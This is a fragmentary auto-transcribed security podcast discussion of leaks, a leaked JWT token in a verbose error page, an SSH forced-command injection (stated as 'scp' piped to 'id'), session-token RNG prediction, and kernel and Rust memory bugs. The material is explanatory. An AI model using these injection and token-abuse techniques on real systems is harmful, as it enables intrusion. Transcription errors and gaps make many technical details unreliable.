{\"speaker\": 2, \"line\": \" yeah, but I mean obviously something notable stuff like you said source code for iOS the Wiis operating system. And obviously all the data sheets very long before the actual console Hardware.\", \"start\": 845.1}, {\"speaker\": 1, \"line\": \" Yeah, and that seems to be because apparently the company that did a lot of the development on the Wii which was brought on apparently their server got hacked. That's how all the files got leaked now. I don't want to say that we endorse leaks or anything like that because legally that probably wouldn't be too smart. I will say though that it is kind of cool that you can take a look at the source code. Outdated console especially one like the we just because the we was way ahead of its time man. It was a really cool console and I think it'd be really neat to check out the source and design specs of that. So I wonder how like aggressively Nintendo is going after leaks because Nintendo is\", \"start\": 860.5}, {\"speaker\": 2, \"line\": \" really happy and trying to take down some of these already.\", \"start\": 906.2}, {\"speaker\": 1, \"line\": \" Yeah, Nintendo's usually pretty pretty heavy on the gas pedal when it comes to leaks and stuff like that. They don't tolerate it at all at the same time though.

And then even then it was like a hundred times slower than the native Hardware so you probably can't do anything super useful with this stuff.

Like Zoom isn't going to want to cannibalize their own platform and get people using key base. They're going to want to integrate key base with\", \"start\": 1434.7}, {\"speaker\": 1, \"line\": \" zoom.

Yeah, I guess part of what my thought process is. I wonder if we're going to start seeing more and more people stopped using key based just because its affiliated with zoom at all.

I think people you know, especially because a lot of people use key baits are using it because they want that privacy and security aspect. You know what I mean? And when you start affiliating with a company like Zoom, even if you ignore the Chinese, you know weird ties going on there also have you know, all the all the pr they've gotten for the stupid crypto issues that they've had which like you said the key base team is more competent, but just that affiliation, you know, it's kind of like that. It kind of like infects the brand I guess. People just don't want to affiliate with it anymore.\", \"start\": 1530.3}, {\"speaker\": 2, \"line\": \" Yeah, I can see that happening personally.

I mean probably not but it you know, it's possible so we can keep an optimistic Outlook. That's my thought process he pauses. Anyway, did you have something else to add there because I know I know no not really. Okay, so we'll get back into even more leaks. So everyone listening to the podcast has probably heard about this. It was the Microsoft GitHub account getting hacked allegedly over 500 gigs of data from private GitHub repos were, you know leaked from the GitHub account? Now from Microsoft's GitHub account there. Yeah from their organization account. so the private repos were compromised now from what I know it is worth noting that I don't think there's anything in there private repos that's really earth-shattering it's not like they have Windows kernel source code just sitting in a private repo on GitHub from what I know a lot of the stuff that was private on there is just stuff that there was one or two people working on or it was stuff that was meant to go public at some point anyway\", \"start\": 1620.3}, {\"speaker\": 2, \"line\": \" yeah well that's what it seems like the official statements been is that the stuff on the GitHub is generally stuff that's was going to be going public if it wasn't already\", \"start\": 1686.9}, {\"speaker\": 1, \"line\": \" public Yeah, which still sucks for Microsoft? You know what? I mean? You want to have that like release, you know what I mean, like thinking about like going back to the tool chain, like it would suck on somebody like the tool chain before I wanted to release it, but it's not as serious as it could have been basically.\", \"start\": 1696.5}, {\"speaker\": 2, \"line\": \" Yeah, I mean at the same time.

And yeah, it's basically it seems like the GitHub was being used for projects that would likely go public soon or very small projects just they needed something really quick didn't want to use like an internal repo for it like a couple people working on something type deal.

We have a tale of for both error message messages and a JWT token though. This one was pretty interesting.

It has some other things built into it for testing. It's a test Suite Essentially, so the authorized extension will any request that comes through it'll make the request using another set of cookie. So swap out the cookies and don't make a request without the cookies that same endpoint to that way. You just have automated testing one making sure other users can to access like cross user horizontal authentication bypasses.

I mean you could have a large error page I mean the error page can YouTube for example dumps a pretty large blob of basics for data your page which isn't all that unexpected it's unexpected in this case just because the other are pointed don't do that the one in particular did so what's actually kind of important here also is as I mentioned it's a tale of a verbose error message and JWT token so what is important is during the testing while testing this application we're not told what the application is just to be clear as we're just talking about an application that's because we're not extolled what it is just it's similar to get Hub in the fact that you could create kind of public and private repositories or projects not actually repository sir you can collaborate one of the features was the ability to duplicate a project so you have whatever project and this one the reason why that feature stood out to this test or is because it required a JWT so Json web token which we've talked about issues with before that unlike most of the application gives the cookies that we were just talking about before and there were a couple features or three features that need these JWT tokens for some reason and that was duplicating the project downloading a project as a zip and writing files to the project What he found was that the unauthenticated request to this duplicated project. So if you were theft has another user you didn't get this but you got an HTTP 500 response when you try to duplicate a project without any of the cookies and without it the JWT. A specter was just getting on that one in particular was much longer than any of the other responses. And if we actually take a look at the screenshot. From a hill kind of notice that you get or at least this is what I noticed from it the response there. It's a Json blob and has an error as the kind of main entry and then you've got another object. I nested in there which has a message containing full HTML in it. Including what looks to be a at least I thought it looked like a stack trace a little looking at it right now. I'm actually not seeing that but what you do notice is you've got this full HTML page in there and you've got a bunch of headers in there also. So what I think's going on here to have an application that would authenticate with another server. So you'd hit this endpoint this duplicate project or whatever you'd hit that end point and it would proxy the requests over to another server. I mean it would pass that j-dub Tito and term to do the authorization and then this case it wasn't expecting to handle any sort of are so gets a 500 like I don't know what to do with this. Let's just dump everything back to the client, which is generally bad practice. You want to handle you want to handle your messages basically give a minimal amount of information. So what's interesting in this is you basically get to see some of the headers that get added by that proxy which ends up including private crafts its own token. If you don't provide one, which is kind of the core of the issue here make crafts its own token, which they refer to as it's basically a god token. Although it doesn't sound like it's actually a god token. It sounds what they determined was that if you made this request to duplicate a project without authentication, it would generate a new user and issue a token to that user with privileges to whatever project you're trying to duplicate. The endpoint would are out for whatever reason that they did know, but that token could then because it got exposed here because the air could be used on other. Request and would give you access to whatever project that token was created for. It's a very roundabout way of saying making this request result in error.

This is kind of limited by the fact that the projects are given unique uids. So you have to have a unique uid of a project you want to hit so you know there is that bit of a limiting factor on it. I think in this article though, they even argue they put a made the uuid even stronger to try to prevent hitting the system issue.

And it has an SSH Daemon on it that SSH Daemon does use the force command directive in order to force it. When when you login I'll execute whatever the force command is. It's not going to like you just XU here bash shell or whatever. So it executes this mCP package wrap command. And that command effectively just ends up looking here. I pulled up on shrink for those of you watching if the SSH original command starts with SCP. It'll just evaluate whatever the original command was. So it seems like that's basically to like you SCP off the router fairly easily. The problem is as you can see it just looks for the string to start with S. EP it doesn't care. What else comes In that string just if it starts with S EP so there's a pretty obvious injection there. Actually, it's brought up right Stark SCP pipe ID or pie pie pie D.

And the funny thing about that is they're kind of diametrically opposed. Usually if you're leaking memory, you're not freeing memory aggressively to have uafs as well. It's kind of, you know two different ways, but they're talking about memory leak in terms of the information disclosure, which is obviously a lot more powerful for exploitation.

where Facebook session tokens were broken by in a very similar way so what goes on with the Twister RNG is they get seated by time kind of went squid those it's very first request coming through it'll see that just with the time and then it's number of knots it generates each time you request a new random number generator just have increments a counter by one as it goes through the entire state of the RNG so if you know the number of knots that have been generated or the number of times it's been called number of bytes read out from it and you know the time that it started you're able to predict what the RNG will open next so they were able to take advantage of that if you can cause the server to crash or otherwise know that know the value of when of the time at which the server restarted you can as I mentioned you can predict the RNG so then you know the value of the orangey you know the creation time so then the only unique value in that hash is the pointer so you can Brew Force the pointer to still leak at so the hash just didn't work and as I was mentioning about Facebook is I believe quite a while back I want to say like 2008-2009 somewhere in there I think maybe a little bit later I don't think it will be much later than that Facebook's use kind of the default setting for PHP okay and which were basically dealt with in the exact same way so if you were able to crash or just waited for Facebook to crash or restart you are able to predict all the session token it's coming out and login as other users because of that makes sense that said so in this case they do need to crash the server to actually abuse this attack they mentioned and there's a lot of ways you could do that I mean one my favorite would be the tow truck attaches drive a tow truck into it

use after free because they'd all get garbage collected before the owner object does so the owner object will try and delete it and Away you go with the crash so that's how they were able to get the

defense-in-depth things so yeah you still have above you could technically overflow the ref count but if you have the ref count set at a size that's you know large enough it's you're not really going

of the the Achilles heel of windows so the they go down they break down a lot of the background to likes all the functions involved if you're not too familiar with Windows stuff it might you know confuse you a little bit because you know it is using the windows API and everything but it seemed like the issue basically boiled down to a function being mislabeled they had a function called Microsoft Telemetry is triggered no KR X km it's like the longest function name ever and you know it has a certain the name you would you would figure it would throw an exception or it would you know terminate the process if an assertion failed it turns out it was just mislabeled it wasn't actually in\", \"start\": 4742.2}, {\"speaker\": 2, \"line\": \" assert I don't know if I'll say it was mislabeled so it's Microsoft Telemetry assert triggered no Arts Camp so that could be that it's Microsoft Telemetry I served was triggered so laughter and assertive which trigger not actually triggering the assert itself and no warrick's cam so like I could understand why this is named I won't say just mislabeled that said the issue it could have been a murder the issues pretty straightforward here because you have some jumping back just a little bit in this particular function that's vulnerable the NT user resolve desktop for a while which is called from zuerlein implementing Colonel it's a syscall user lad rapper it takes a in and out parameter just a pointer that's going to get the value or the return value placed into it it does some checks on the validity of the data it checks of course at the pointer is to use their line data because you don't want the colonel you don't want to be able to use that to tell the colonel to overwrite Something in the kernel of course it checks all the copies all the fields into local kernel memory and checks that the length is less than the max length honestly again making sure that you're not going to overflow any buffers and that the buffer itself exists entirely within user line so you can't like give it a big number and get a to go into Colonel area or overflow whatever so the issue here just kind of giving you that background it's my matter for the actual exploit the issue is that it does this one check that was added in early on it just goes and checks if the length and 100 and so it's on its way well yeah checking if it's odd because the length should always be even for they do explain why that's the case right you know coach sir it's always two bites every characters at least the two bites so you can't have an odd length string so just checks that simple check calls that assert presumably thinking that it is an assert and not just as Telemetry call or whatever and then in the else of that is where performs all these checks like the maximum length checked so what ends up happening though is because Microsoft element forget does return it's not an assert it returns so you basically if you send it the odd sized buffer or the outside size\", \"start\": 4795.4}, {\"speaker\": 1, \"line\": \" length\", \"start\": 4957.2}, {\"speaker\": 2, \"line\": \" it'll just skip all

the core of the issue they do go into of course exploiting this and you can kind of maybe see where this is going given by what I mentioned earlier where you know there's that concern about copying in and out of Kernel memory you can actually race this you pass in an appropriate Unicode string that it'll accept the kernel verifies that the buffer is safe and then the user line modifies it before the kernel actually ends up using the unfair before the colonel copies in all the checks because gain it doesn't do all of those checks oh so when you give us a lot size length it's going to skip all the checks and then the colonel land sorry I have kind of confused myself\", \"start\": 4965.5}, {\"speaker\": 1, \"line\": \" here yeah I know I was a little bit confused on that to the way they were

confused I didn't notice this\", \"start\": 5057.7}, {\"speaker\": 1, \"line\": \" before yeah I was under the impression that that was the same thing that it was just basically skipping that else

2, \"line\": \" there's probably still use or lot so before things get copied oh so there's probably just some yeah I'm not sure now I mean I'm trying to come up with a reason here but it seems like I

they actually went to exploit it they were using that as just a example of kind of the type of issue that this is trying to prevent the actual issue is as we were saying they're the vulnerability here is you know after this November 20 19 update which adds this check if the length is odd the execution will just continue and all the checks are skipped that's just that is how it is I wrote down the talk to issue because they do just explain what the sir kind of check time of use issue is but they're using that here we go and the code there they're using that just has the following scenario using

sucks that they didn't show how you could like weaponize the exploit and the reason I say that is I'm pretty sure Windows kernel now at least a lot of it is has CFI now I think Windows kernel is getting stronger in trying to prevent post exploitation or you know exploitation post memory corruption so it would be it would be cool to see how you could get around those mitigations but obviously

the one I was talking about where they say multiple interaction lists are seized and they as a result of this is a quote here as a result of my fuzzing identified 5218 unique crashes and a lot of these are reasonably exploitable looking I obviously haven't ridden into all foam and there's some concerns over but jumping back about what was actually getting fuzzed just takes me a while to scroll up through all that is that there's this Sky ischia sk-ii a library that's used to load and display images through various kind of standard apis and that could be used know obviously to do images that are displayed like as part of the APK itself or as part of a okay but that will also include images from untrusted sources so like MMS messages chat applications emails web browser Gallery app whatever well using Curtis well exactly seems like a perfect Target so that's what they start fuzzing and looking at and they in particular I think they focused on these qm + RQ M GQ manage images

the majority of the crash that they had were in what they refer to as just a read one byte and they talked about kind of how they classified all of these so they have like 3 1 2 4 8 16 32 here

to the buffer is marked as a red zone and if a write or read happens there that triggers a crash right that's how ASN a saint squee does it now typically with like 1 & 2 by trites those are so small that they usually don't hit a Red Zone usually like out of bounds rights by only like 1 to 4 bytes or even sometimes one to eight bytes just don't hit a red zone and they don't get detected so I do

Kernel topic and Will Will Roll right into Linux so we have a Linux few texts virtual file system use after free so this one is quite complex and I mean complex even as far as kernel bugs go it's a bug reported by Jan horn and Jen horn he's like a really really smart guy he's like really into Linux it's kind of like the the Ian fear of Linux if you know who that is from Apple stuff and the bug seems to be in the get few text key function which holds a reference to an inode but for some reason he couldn't even really figure out exactly why but it seemed if you didn't hold a mount Point reference or if you had a callback in the superblocks of superblock Destruction code that I knowed can end up getting torn down while it's being used and obviously that's that triggers a use after free so few taxes for people don't know basically stands for a fast user space mutex there honestly not used very often in fact I don't think I've ever used one I don't know if you've ever used onesie I don't know if I know anyone who's ever used one they're like really low level so that's part of the reason why this subsystem is so complex and why even even Jan horn doesn't know 100% what's going on here it's kind of applying guesswork to an issue that he found and what makes it even more interesting is if you you scroll down to the bottom even says I'm not even sure how you'd go about fixing it or something to that effect it is just it's one of those like weird bugs that it's like okay I can see it I can reproduce it but it's such a weird subsystem that I don't even I don't even know what's causing it really so it's just it's one of those pool you know generally when you're talking about Colonel you're already dealing with a hard subject matter but you know this one seems to be a

finding the file a few textures go straight to that underlying page via the get user page fast function it only sees that I note so it's not holding as you mentioned it's not holding that reference to the Mount point so if you do destroy that mount point which will implicitly destroy the inode it's not going to know about it it's not going to receive any notification it's like I don't think it's too hard to get the core issue here exactly why that happens I mean so that's where maybe it's a little bit confusing but at the very least like the core issue here is it's basically just skipped a step for the purposes of performance by not doing that slow walk through the entire trade to find the page properly and actually get the full Struck it just has the inode value so I don't think it's

the actual bug would be and I mean he does mention the strafe or just walk the tree for the look up but at the same time that's going to be a significant performance hit like there's probably a reason

out with the Miura Colonel rootkit for the PS4 stuff it's so hard to write good kernel code so you know I don't even like you like some kernel bugs like the next one we're going to get into our egregious I don't think they're really forgivable but I'm generally a lot more forgiving with kernel bugs because they're just they're so easy to make and there's they can be tough to fix like this

has it in its name is why they attached at the Huawei and okay parents kind of silly anyway yeah the issue is really simple they have a right Handler and you know when you're when you're writing a day you're going to be copying data from user land into a kernel buffer that kernel buffer happens to be a stack buffer of 32 bytes and they take a user provided length and they don't do any checks on it

and protect against said somebody that has some issue and yet still makes those completely basic mistakes oh man I don't know I guess it's yeah it's a little bit weird that said I don't okay I was going to say I don't see where they have Huawei as their organization but like I'm pretty sure that's like literally just like I think that's a user provided value like I don't think there's a part of

\"line\": \" issue yeah that's another Point yeah and the irony is well of it being like you know a colonel self-protection driver that has this kind of issue yeah it's pretty funny that being said we'll move on to research will move into vaccines everybody loves vaccines so this is a post by a black arrow and it's called Ragnarok stopper development of a vaccine so I must say I do love the idea of vaccines or just messing with malware in general this is kind of off topic but I just kind of want to bring up a talk that I remember at Defcon a few years ago there was a talk I saw at Defcon 26 I want to say I was talking about fuzzing for and exploiting vulnerabilities and malware to kill the malware was like it was one of the most interesting talks so I can remember seeing but basically the idea of vaccines is you find something that the malware checks that will shut itself down from running like a VM check or something like that and you abuse that to basically Force the malware not to run\", \"start\": 6617.7}, {\"speaker\": 2, \"line\": \" yeah and I think actually there has been previous Research into and to creating more of a general-purpose vaccine that would make make your normal system look like it's a VM so malware just wouldn't run on it so it's not a new idea but I don't think we've had the opportunity to actually talk about this idea of a malware vaccine before\", \"start\": 6684.6}, {\"speaker\": 1, \"line\": \" on the web either\", \"start\": 6703.9}, {\"speaker\": 2, \"line\": \" on the podcast so that's kind of why I want to bring this one up in particular I don't think like this is terribly interesting like you understand the idea as you mentioned you're just trying to find you find something check that the malware does I know are forced not run because ideally malware's trying to remain undetected so part of that is when an analyst will open it and take a look at you want to detect that and not do anything malicious during that period so it's like an automated tool examining the malware it's gonna be like okay it doesn't do anything to whirring so whatever you know let's Let It Go that's kind of where love these come down from this this vaccine in particular doesn't this one in particular it will use a crate event will use the event to and if you're not familiar it's basically like at least as I understand it effectively Like This Global Flay kind of thing you have between different programs the create event and windows so it'll create a unique event that way only one instance of the malware actually runs at a time so you don't have like the to and says running trying to encrypt the same files or something if it's around somewhere so in this case so if you just beat the mail worked creating that event and make it think that it's already running it'll just not run any further it doesn't do any check besides checking if this event objects already been\", \"start\": 6705.4}, {\"speaker\": 1, \"line\": \" created yeah kinda reminds me of when I saw before I can't remember the exact malware I want to say it was maybe muri or something like that but there was one where they just took like a mutex or whatever like a global lock and the vaccine literally just took that lock first and then none of the actual malware instances could ever take the lock and they would never run so yeah I mean it's kind of the same idea here you know they're just they're they're using that a fingerprint and they're abusing it against them our itself so what are your what are your opinions on on malware vaccine see because I'm curious\", \"start\": 6798.7}, {\"speaker\": 2, \"line\": \" I think it's a fun idea at the same time as soon as it becomes widespread I don't don't just be less effective\", \"start\": 6841.7}, {\"speaker\": 1, \"line\": \" I was hoping we'd had different views I have the exact same to you I think it's neat they're cool to explore but I don't think they're really practical\", \"start\": 6851.0}, {\"speaker\": 2, \"line\": \" for now\", \"start\": 6859.4}, {\"speaker\": 1, \"line\": \" someone like I think by the time someone reverses it well enough to create a vaccine and it's not like going to be affected by a generic vaccine like people there's going to be a lot of people already hit by it anyway it's just kind of it seems\", \"start\": 6859.9}, {\"speaker\": 2, \"line\": \" sure but you can prevent a lot of people from being kicked but that said what if every malware needs its own vaccine or something that's also just going to add up to a lot of extra resources being used on a machine\", \"start\": 6874.6}, {\"speaker\": 1, \"line\": \" it's exactly like real life actually like I remember hearing you know with the common cold you could create a vaccine for it but there's so many different strains of it that it's just not worth the resources and I think that can kind of be applied to malware as well is there so many different kinds of malware out there and different like a modifications of previous malware it's like it's going to be hard to get a generic catch-all vaccine if you can that'd be really cool but if you have to Target a vaccine for every single one of them is just you're just going to be playing a losing game it's just a sucker's bet yeah just do that with I'd agree with that but it is fun it's fun to think about like I was saying like I really enjoyed that talked last year about exploiting bugs and malware to like dossett basically I thought that was really neat\", \"start\": 6885.9}, {\"speaker\": 2, \"line\": \" yeah I mean sometimes it's just you know you do it because you\", \"start\": 6930.6}, {\"speaker\": 1, \"line\": \" can yeah exactly but yeah I think that's pretty much all my thoughts on vaccines but it is like I do like talking about it it's\", \"start\": 6933.1}, {\"speaker\": 2, \"line\": \" fun yeah like I have no hate for them it's just you know in the long term I don't gets the route to\", \"start\":

world study of some Rust programs inspection of in this case 70 rust memory safety issues like actual issues that were discovered in real-world software and a hundred concurrency bugs I mostly care about those memory safety ones they have some insight some suggestions and they put out like a bug detector but I just thought it was to bug detector yeah to Buck that I\", \"start\": 6960.7},

didn't just I was fixing stuff I didn't dig into it what I kind of found interesting here with this paper was just look at how memory safety issues are being introduced into rust applications because like stood like there is kind of an understanding that Russ is generally like a fairly safe language to use tries to have some compile time guarantees there even though it's a native language it tries to kind of keep some performance with the zero cost abstractions and still have security and it you know is concerned about memory safety it's not just giving you you know all the fuck guns you could want\", \"start\": 7014.2}, {\"speaker\": 1, \"line\": \" so what guns\", \"start\": 7056.3}, {\"speaker\": 2, \"line\": \" well it's what else are you going to use them\", \"start\": 7058.8},

give more of an overview I'll jump right into some of the\", \"start\": 7066.2}, {\"speaker\": 1, \"line\": \" issues you know go ahead\", \"start\": 7071.9}, {\"speaker\": 2, \"line\": \" I'm sure I find kind of the pages here basically what they found there like I said they cover fee different things but 17 they had 21 buffer overflows and the airs tended to happen in 17 of them so in most of them and 17 of the 21 The Heirs would happen when they would compute the buffer size or index and safe code but then the out of bounds would happen later in unsafe code and generally speaking a lot of these are just kind of talking about how other the issue who started and unsafe and ended up impact with safe code or started and save code and impact on safe nothing was like completely safe code all\", \"start\": 7075.6}, {\"speaker\": 1, \"line\": \" around\", \"start\": 7118.8}, {\"speaker\": 2, \"line\": \" sorry my mic drop their um nothing was unsafe our sorry nothing was safe code all around like there is no they didn't find any issues that didn't involve some unsafe code at some point so as I mentioned the buffer overflows tended to happen where you would compute that buffer size and safe code use of later and go out of bounds some are would happen when doing that computation and safe code but they also has like uninitialized memory again this is unsafe link to safe code this time where they would use the unsafe code create some uninitialized buffer and then read it or use it in their safe code they had a few invalid freeze 5 out of 10 of them kind of shared the pattern where they would and this was actually one of the interest once because this is kind of a pattern you might see in something like C++ or C but in Rust it's particularly exploitable or at least it's a particular issue if you're watching on the left hand side of the screen there's this unsafe function ft\", \"start\": 7122.9}, {\"speaker\": 1, \"line\": \" open\", \"start\": 7188.6}, {\"speaker\": 2, \"line\": \" and what goes on there as you've got an allocation size of whatever the file object is mutable file and then you assign a new file to with the buffer and the vector and there you're assigning that file to it winds up happening there and this is the common parent that they found for invalid freeze where you would allocate this in this case the variable F the right size and when you assign that new file structure to F that ends the lifetime of the old one resulting in that old previous structure getting free despite the fact there was still uninitialized memory within it and that is the the buff Vector inside of that file struck so it's an invalid free unique to rust so I found that a little bit interesting that said I'm not like your initial your exploitation scenario for that is going to have to be getting something inside of that memory that's getting freed so it's I don't immediately see to yeah I don't immediately see the exploitation of that but it is a memory safety issue that's unique to rust that's kind of cool yeah and so they also talk kind of use after freeze which generally what happened just a lot of sorry\", \"start\": 7193.5}, {\"speaker\": 1, \"line\": \" oh sorry I was going to say favorite bug time\", \"start\": 7281.2}, {\"speaker\": 2, \"line\": \" but yeah I would generally happen just in object would be dropped implicit lie somewhere in safe code but the pointer to the object or a field if the object exists and is the reference inside of unsafe code\", \"start\": 7284.8}, {\"speaker\": 1, \"line\": \" and then they also had double\", \"start\": 7297.8}, {\"speaker\": 2, \"line\": \" fries two of them being from Saved to unsafe but most of them were some unsafe memory operation to create two owners of the value when the lifetime ends our values of drop twice it's like I said there's nothing here that's terribly unexpected you can introduce vulnerabilities it's not that's not earth shattering idea here but it is still interested actually laid out like here are actual programs that are actually doing this it does kind of give you a starting point if you were to be doing an assessment on Russ code what type of issues you should be taking a look for what type of issues you should be looking out for which is where I think the benefit of this paper comes from\", \"start\": 7298.8}, {\"speaker\": 1, \"line\": \" it does kind of seem like the guys who wrote these papers were just getting bombarded by Russ stations and they just got pissed off and they were like we're just going to drop this paper showing how wrong all of you are like it see it seems almost spiteful away\", \"start\": 7345.2}, {\"speaker\": 2, \"line\": \" yeah perhaps like I said I'm not going to speculate on motivation there but I did find it just an interesting read just because I mean it's it's not something that's been talked about a lot I mean it's just how you know Russ is generally safe for people make mistakes but whatever or is this is you know a proper look at it so I appreciate that they also talked about some null pointer dereferences but\", \"start\": 7359.2}, {\"speaker\": 1, \"line\": \" I didn't even care to really\", \"start\": 7386.3}, {\"speaker\": 2, \"line\": \" go into the details on that because of course no pointer generally just isn't\", \"start\": 7387.6}, {\"speaker\": 1, \"line\": \" exploitable yeah so I mean one thing I will point out that I like about this paper is they they look at applications that are real world applications because some of the papers we've looked at in the past they looked at like hobby projects or like small little things that nobody really uses but some of the projects they looked at in here like they looked at aetherium they looked at redox they looked at Servo like three out of the five things in that list I have heard of and they're pretty popular so I kind of like that they you know they went after Big Fish I guess instead of like a lot of papers yeah well\", \"start\": 7391.5}, {\"speaker\": 2, \"line\": \" they went after real stuff yeah they will know projects exactly that said K-9 team canine in chat does remind me of one thing and I will mention that with something's bugs I mentioned unsafe code and Safeco they do talk about a little bit about having like some of these do come over unsafe code that's internal to some other Library it's not just like exposed unsafe so like the libraries that actually have some of these issues may be only using safe code but the issues are introduced kind of Elsewhere so I just figured that was worth pointing out the comet there was that he found a real Rusty uaf it was said as Sal of morning it's if hard are but they fix that about a year ago a hundred percent Russ code know it's safe so that's kind of where I want to make the bench there's in this case like a lot of them talk about where the unsafe is but the unsafe part of it wasn't necessarily exposed the end user and they kind of have that as one of their insights so is interior unsafe as being a good way to encapsulate the unsafe stuff so that is having like a function to have just exporting it as unsafe having it as like an internal leaves it so people can be using kind of the safe interface\", \"start\": 7431.2}, {\"speaker\": 1, \"line\": \" so on that note I did kind of have a question on this before we move on to shout-out see yep what are your thoughts generally around unsafe because when when you talk to like people who really love rust and people really hate rust there's like a big controversy around unsafe some people think it's really dumb that it's even supported some people think that you know it the common thing I've seen around it is it allows you to do stuff that you otherwise wouldn't be able to do and it at least marks that hey this is like a big red flag there could be something bad you're like if you're running into issues it's probably in this area since this Mark is unsafe you follow like in that latter category\", \"start\": 7514.7}, {\"speaker\": 2, \"line\": \" yeah I definitely fall into the category that thinks that's good to Mark those unsafe areas I think that's definitely a positive Improvement because when it comes to doing a code review if you have to check all the code like you can do it you can do a code review over absolutely every line of code and in fact like that should be done also but having things marked as unsafe gives you an idea of where where to focus your time where somebody who's cares about security should be looking at so when when you see that on saves like okay I have to take special care here to make sure this doesn't have any side effects that are going to be abused later whereas if you don't have a marked as unsafe everything is fair\", \"start\": 7560.1}, {\"speaker\": 1, \"line\": \" game yeah I mean the common argument I see against unsafe and rust is that it's kind of antithetical to what Russ is trying to accomplish but I mean I can but it\", \"start\": 7602.2}, {\"speaker\": 2, \"line\": \" needs to be unique you can't as a language it's trying to be able to work in like that system area and sometimes you need to be able to bring done save code that's actually one of the insights that they make in this paper inside number one is most unsafe usages are are for good or unavoidable reasons they mentioned that indicates that Russ rule checks are sometimes too strict and that's useful that useful to provide an alternative way to escape those checks but still at the core point there is a lot of the unsafe usage it does have a purpose and either Russ needs to stop checking that which way do we can overall security or keep the strict security but allow people to say hey I know what I'm doing now I'm going to do that in anybody else can come along and see hey they think they know what they're doing let's prove them\", \"start\": 7615.0}, {\"speaker\": 1, \"line\": \" wrong yeah kind of like I want to take the you know the flotation device off I can swim you know what I mean and I cut Edge towards that to like you know it's very useful to be able to narrow down your focus on trying to nail down a bug and have that functionality available to you then just not have it at all so yeah I had towards the same way but I was curious if you had like a you know I one of the I think it's the unsafe people\", \"start\": 7671.2}, {\"speaker\": 2, \"line\": \" know I thought when you're going bring up on safe I thought you were going to talk about the unsafe gation which is like whether or not you should have if you use any unsafe code should all the code that uses that unsafe be considered unsafe\", \"start\": 7698.6}, {\"speaker\": 1, \"line\": \" so that's kind of why I was talking about before deception levels I don't know if I could go that that big brain\", \"start\": 7713.0}, {\"speaker\": 2, \"line\": \" yeah I mean it's definitely a debate that's out there though I mean we definitely don't need to discuss it I imagine we probably both just agree that it would make little sense to actually have that unsafe propagate\", \"start\": 7720.3}, {\"speaker\": 1, \"line\": \" yeah no I\", \"start\": 7735.0}, {\"speaker\": 2, \"line\": \" just everything would be unsafe because eventually as like the really low level it is necessary\", \"start\": 7736.3}, {\"speaker\": 1, \"line\": \" yeah the question is when do you stop considering it\", \"start\": 7743.6}, {\"speaker\": 2, \"line\": \" unsafe yeah so I mean it's like yeah well oh just end up like if

but so Z all I know you have a few shoutouts I don't really have any shoutouts to this is going to be kind of here your solo section of the show but yeah I know I know you have some shout outs and one

one of the other post so was from Rhino security labs and introduction to Google Cloud platform privilege escalation and it's just that it's actually a part of a two-parter that just talks about some different privilege escalation techniques I didn't think it was worth kind of covering on the show because it's not like India wax flight but if that's an area it seems like a pretty good resource and the last thing has a shout-out is from Maddie Stone and John Hopkins University beat the machine Workshop seems like there's something that she worked on a few years ago if you're not familiar with Maddie Stone part of project zero we've talked we've covered her right up before and I know we've covered one presentation by her or maybe the presentation was attached either we've talked about some for work before yeah for sure and so what she has is it's an introduction to reverse engineering and I thought it was an interesting approach some actually I spent a little bit more time talking about this shout out but it's focused it's fairly beginner it's something you could probably do in a couple hours or less it depends on what your if your experience with this you all doing like minutes but its Target audiences from middle school to college students who have you know some programming exposure some familiarity with binary or hexadecimal but like not much more than that as an introduction to reverse engineering and just a few problems we've got a picture of one where you essentially go from they show you the binary you know white boxes and black boxes for one or four zeros\",

have to do the binary translation but just provides this really simple fortunately I don't have a picture of it very simple instruction set so you kind of get that process of going through that process of kind of doing that translation to understand how that works and yeah I thought it was just an interesting approach on that again something you could probably it's I want to say there's four or five exercises on there so there's not a lot to it there is a presentation that goes along with it also like slides are available but I did think it was an interesting approach because one I mean

the screenshot I've got is from the difficult one the easier ones are the exact same problems the only difference is that they include more information in there so you might get a little bit more of

I'm Specter with me a zi welcome to the Star Wars edition of the day Zero podcast. No, the reason I'm saying that is Happy Star Wars day to anybody who celebrates that I know we're a few minutes late today because we've been having some fun technical issues both on our side and on Twitches side. It seems to which apis having some issues right now and and also apologies if like at some points, I sound a little bit, you know unenthused compared to normal on the podcast because I do have a bit of a headache that just sprung up before the It's like everything's trying to compound today. So it's been a fun day for for pre stream, but we will jump into talking about some stuff before we get into news though. I think we'll do a bit of a summary on decompilers because over the last couple weeks. We've been talking a lot about the Benja decompiler that recently dropped and during last week. We were analyzing the realize decompiler on we did a stream about So I think we want to do like a summary of some of the points that we had for both realize and Benja and we figured we'd kind of you know, plug that in to the beginning of this\", \"start\": 9.2}, {\"speaker\": 1, \"line\": \" episode just a quick summary there. So I mean we don't think most people are going to be too enthused about watching. How know what do we have eight nine hours? Where's the streaming between the two of them? I think\", \"start\": 73.9}, {\"speaker\": 2, \"line\": \" both it's very rare for a hours. Yeah, both of them were almost four hours on the nose. So yeah, they were quite long strange and part of the reason for that is we had a lot of discussion with Benji Deb the joined us for both streams, which is really cool. There's actually some really insightful discussion there for anybody wants to check out the vod's maybe it is worth like going back and clipping some of those discussions because some people might find them interesting. But yeah, it is like it did they are quite long. Strained so we are going to do like a bit of a summary here though. I think we'll start with realize just because we covered that this week. So some of the points that we noticed. So we I have a few like a negative and positive points that were summarized from the street before\", \"start\": 88.2}, {\"speaker\": 1, \"line\": \" you jump to the points. I do want to offer one correction on something I'd say that last time we were talking about realize which was just about being able to copy out code apparently that you can do it. And like I said, I figured that was probably a user what was it was? It was a right click and then it was under a submenu. I think you would found\", \"start\": 129.4}, {\"speaker\": 2, \"line\": \" it Specter. Yeah. Yeah the right click on it and it was copy as text or something like that.\", \"start\": 148.3}, {\"speaker\": 1, \"line\": \" I think it was still under a sub menu yet, then copy us text or export. I think\", \"start\": 153.5}, {\"speaker\": 2, \"line\": \" ya might have been export. Yeah, I mean to say what you were saying layered with like user are kind of a user error, but at the same time I think that is very unintuitive. And that is one thing I found with realize is there there's a few things that should be more. More intuitive to the user experience that are not so you can do them. But you have to kind of go digging to know that you can do them the know how to do them though. I do think there needs to be some work on the unlike the UI and the ux there to make realize more intuitive to use but I guess I'll jump into some of the points. So first I'll cover some of the things that I found were an issue. One of them was structure accesses wouldn't get Rewritten. You change the type of a variable to a structure. So if you you know by default when you have an array or sorry not an array, if you have a structure it gets written as an array in the decompiler output. But in Binger, for example, if you change the type of that variable from an array to a structure it will rewrite all the accesses on that whereas realize doesn't actually do that. So there's a bit of a bit of a weird thing there where it doesn't rewrite the decompiler. I put the other thing I found was the casting was sinus was Wrong, 